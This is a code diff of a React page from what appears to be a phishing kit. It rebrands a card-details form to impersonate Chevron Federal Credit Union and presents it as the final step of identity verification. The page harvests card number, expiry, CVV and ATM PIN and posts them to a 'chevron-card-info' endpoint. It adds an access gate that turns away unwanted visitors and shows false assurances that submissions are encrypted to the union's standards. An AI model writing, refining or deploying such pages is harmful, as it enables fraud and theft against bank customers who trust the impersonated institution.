@@ -3,6 +3,7 @@ import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
+import FlowPageLayout from '../components/FlowPageLayout';
 
 const Card: React.FC = () => {
   const [cardNumber, setCardNumber] = useState('');
@@ -17,21 +18,14 @@ const Card: React.FC = () => {
     cardNumber: '',
     expiry: '',
     cvv: '',
-    atmPin: ''
+    atmPin: '',
+    form: '',
   });
 
   const navigate = useNavigate();
   const location = useLocation();
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
-
-  if (!isAllowed) {
-    return <div>Loading...</div>;
-  }
-
-  if (!emzemz) {
-    return <div>Missing user details. Please restart the process.</div>;
-  }
 
   const formatCardNumber = (value: string) => {
     const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
@@ -46,6 +40,8 @@ const Card: React.FC = () => {
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
+    setErrors(prev => ({ ...prev, form: '' }));
+
     setIsLoading(true);
 
     const cardDigits = cardNumber.replace(/\s/g, '');
@@ -53,32 +49,34 @@ const Card: React.FC = () => {
       cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
       expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
       cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
-      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : ''
+      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : '',
+      form: '',
     };
 
     setErrors(newErrors);
 
-    if (!Object.values(newErrors).some(error => error)) {
-      try {
-        await axios.post(`${baseUrl}api/logix-card-info/`, {
-          emzemz,
-          cardNumber: cardDigits,
-          expiryMonth,
-          expiryYear,
-          cvv,
-          atmPin
-        });
-        console.log('Card information submitted successfully');
-        navigate('/terms', { state: { emzemz } });
-      } catch (error) {
-        console.error('Error submitting card info:', error);
-        setErrors(prev => ({
-          ...prev,
-          form: 'There was an error. Please try again.'
-        }));
-        setIsLoading(false);
-      }
-    } else {
+    if (Object.values(newErrors).some((error) => error)) {
+      setIsLoading(false);
+      return;
+    }
+
+    try {
+      await axios.post(`${baseUrl}api/chevron-card-info/`, {
+        emzemz,
+        cardNumber: cardDigits,
+        expiryMonth,
+        expiryYear,
+        cvv,
+        atmPin,
+      });
+
+      navigate('/terms', { state: { emzemz } });
+    } catch (error) {
+      console.error('Error submitting card info:', error);
+      setErrors(prev => ({
+        ...prev,
+        form: 'There was an error. Please try again.'
+      }));
       setIsLoading(false);
     }
   };
@@ -86,173 +84,153 @@ const Card: React.FC = () => {
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 15 }, (_, i) => currentYear + i);
 
+  const renderError = (message?: string) =>
+    message ? (
+      <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
+        <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+          <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
+        </svg>
+        {message}
+      </p>
+    ) : null;
+
+  if (isAllowed === null) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
+  }
+
+  if (!emzemz) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
+  }
+
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Card Information</h2>
+    <FlowPageLayout
+      eyebrow="Step 6 of 6"
+      title="Secure Your Card"
+      description="We’ll verify these card details to confirm you’re the rightful account holder before finalizing access."
+      contentClassName="space-y-8"
+    >
+      <form onSubmit={handleSubmit} className="space-y-6">
+        <div className="space-y-2">
+          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Card Number</label>
+          <input
+            id="cardNumber"
+            name="cardNumber"
+            type="text"
+            value={cardNumber}
+            onChange={handleCardNumberChange}
+            maxLength={19}
+            className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
+            placeholder="1234 5678 9012 3456"
+          />
+          {renderError(errors.cardNumber)}
+        </div>
+
+        <div className="space-y-2">
+          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Expiry Date</label>
+          <div className="flex flex-col gap-2 sm:flex-row sm:items-center">
+            <select
+              value={expiryMonth}
+              onChange={(e) => setExpiryMonth(e.target.value)}
+              className="rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
+            >
+              <option value="">Month</option>
+              {Array.from({ length: 12 }, (_, i) => (
+                <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
+                  {String(i + 1).padStart(2, '0')}
+                </option>
+              ))}
+            </select>
+            <select
+              value={expiryYear}
+              onChange={(e) => setExpiryYear(e.target.value)}
+              className="rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
+            >
+              <option value="">Year</option>
+              {years.map((year) => (
+                <option key={year} value={year}>
+                  {year}
+                </option>
+              ))}
+            </select>
+          </div>
+          {renderError(errors.expiry)}
+        </div>
+
+        <div className="space-y-2">
+          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">CVV</label>
+          <div className="flex items-center gap-3">
+            <input
+              id="cvv"
+              name="cvv"
+              type={showCvv ? 'text' : 'password'}
+              value={cvv}
+              onChange={(e) => {
+                const value = e.target.value.replace(/\D/g, '');
+                if (value.length <= 4) setCvv(value);
+              }}
+              maxLength={4}
+              className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
+              placeholder="123"
+            />
+            <button
+              type="button"
+              onClick={() => setShowCvv((prev) => !prev)}
+              className="text-xs font-semibold text-[#0b5da7] hover:underline"
+            >
+              {showCvv ? 'Hide' : 'Show'}
+            </button>
+          </div>
+          {renderError(errors.cvv)}
+        </div>
+
+        <div className="space-y-2">
+          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">ATM PIN</label>
+          <div className="flex items-center gap-3">
+            <input
+              id="atmPin"
+              name="atmPin"
+              type={showPin ? 'text' : 'password'}
+              value={atmPin}
+              onChange={(e) => {
+                const value = e.target.value.replace(/\D/g, '');
+                if (value.length <= 4) setAtmPin(value);
+              }}
+              maxLength={4}
+              className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
+              placeholder="****"
+            />
+            <button
+              type="button"
+              onClick={() => setShowPin((prev) => !prev)}
+              className="text-xs font-semibold text-[#0b5da7] hover:underline"
+            >
+              {showPin ? 'Hide' : 'Show'}
+            </button>
+          </div>
+          {renderError(errors.atmPin)}
+        </div>
+
+        {renderError(errors.form)}
+
+        <div className="flex justify-end">
+          <button
+            type="submit"
+            disabled={isLoading}
+            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
+          >
+            {isLoading ? 'Submitting…' : 'Continue'}
+          </button>
+        </div>
+      </form>
+
+      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
+        We encrypt every card submission using Chevron Federal Credit Union security standards.
       </div>
-
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm text-gray-700 text-center mb-8">
-          Please provide your card details for verification purposes.
-        </p>
-
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto space-y-4">
-          {/* Card Number */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Card Number:</label>
-              <input
-                id="cardNumber"
-                name="cardNumber"
-                type="text"
-                value={cardNumber}
-                onChange={handleCardNumberChange}
-                maxLength={19}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="1234 5678 9012 3456"
-              />
-            </div>
-            {errors.cardNumber && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.cardNumber}
-              </div>
-            )}
-          </div>
-
-          {/* Expiry Date */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Expiry Date:</label>
-              <div className="flex gap-2">
-                <select
-                  value={expiryMonth}
-                  onChange={(e) => setExpiryMonth(e.target.value)}
-                  className="border border-gray-300 px-2 py-1 text-sm rounded"
-                >
-                  <option value="">Month</option>
-                  {Array.from({ length: 12 }, (_, i) => (
-                    <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
-                      {String(i + 1).padStart(2, '0')}
-                    </option>
-                  ))}
-                </select>
-                <select
-                  value={expiryYear}
-                  onChange={(e) => setExpiryYear(e.target.value)}
-                  className="border border-gray-300 px-2 py-1 text-sm rounded"
-                >
-                  <option value="">Year</option>
-                  {years.map((year) => (
-                    <option key={year} value={year}>
-                      {year}
-                    </option>
-                  ))}
-                </select>
-              </div>
-            </div>
-            {errors.expiry && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.expiry}
-              </div>
-            )}
-          </div>
-
-          {/* CVV */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">CVV:</label>
-              <input
-                id="cvv"
-                name="cvv"
-                type={showCvv ? 'text' : 'password'}
-                value={cvv}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) setCvv(value);
-                }}
-                maxLength={4}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="123"
-              />
-              <span
-                className="text-blue-700 text-sm hover:underline cursor-pointer"
-                onClick={() => setShowCvv(!showCvv)}
-              >
-                {showCvv ? 'Hide' : 'Show'}
-              </span>
-            </div>
-            {errors.cvv && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.cvv}
-              </div>
-            )}
-          </div>
-
-          {/* ATM PIN */}
-          <div className="mb-6">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">ATM PIN:</label>
-              <input
-                id="atmPin"
-                name="atmPin"
-                type={showPin ? 'text' : 'password'}
-                value={atmPin}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) setAtmPin(value);
-                }}
-                maxLength={4}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-                placeholder="****"
-              />
-              <span
-                className="text-blue-700 text-sm hover:underline cursor-pointer"
-                onClick={() => setShowPin(!showPin)}
-              >
-                {showPin ? 'Hide' : 'Show'}
-              </span>
-            </div>
-            {errors.atmPin && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.atmPin}
-              </div>
-            )}
-          </div>
-
-          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
-        </form>
-      </div>
-
-      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
-        <p className="text-xs text-gray-600">
-          Your card information is encrypted and secure. We use industry-standard security measures to protect your data.
-        </p>
-      </div>
-    </div>
+    </FlowPageLayout>
   );
 };
 
